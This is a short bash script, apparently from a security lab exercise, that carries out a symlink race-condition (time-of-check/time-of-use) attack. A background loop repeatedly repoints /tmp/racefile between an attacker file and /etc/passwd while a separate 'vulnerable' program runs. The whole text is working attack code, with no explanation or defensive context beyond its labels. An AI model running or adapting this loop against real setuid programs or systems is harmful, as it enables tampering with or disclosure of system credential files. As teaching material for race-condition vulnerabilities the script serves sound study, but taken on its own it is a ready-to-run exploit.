#!/bin/bash
TARGET="/tmp/racefile"
ATTACK_FILE="/tmp/stolen_data.txt"

echo "Starting race condition attack..."
echo "Target file: $TARGET"

echo "Stolen secret data!" > $ATTACK_FILE

while true; do
    ln -sf $ATTACK_FILE $TARGET 2>/dev/null
    rm -f $TARGET 2>/dev/null
    ln -sf /etc/passwd $TARGET 2>/dev/null
    rm -f $TARGET 2>/dev/null
done &

ATTACK_PID=$!
echo "Attack running in background (PID: $ATTACK_PID)"
echo "Run './vulnerable' in another terminal"
echo "Press Enter to stop attack..."
read
kill $ATTACK_PID 2>/dev/null
echo "Attack stopped."
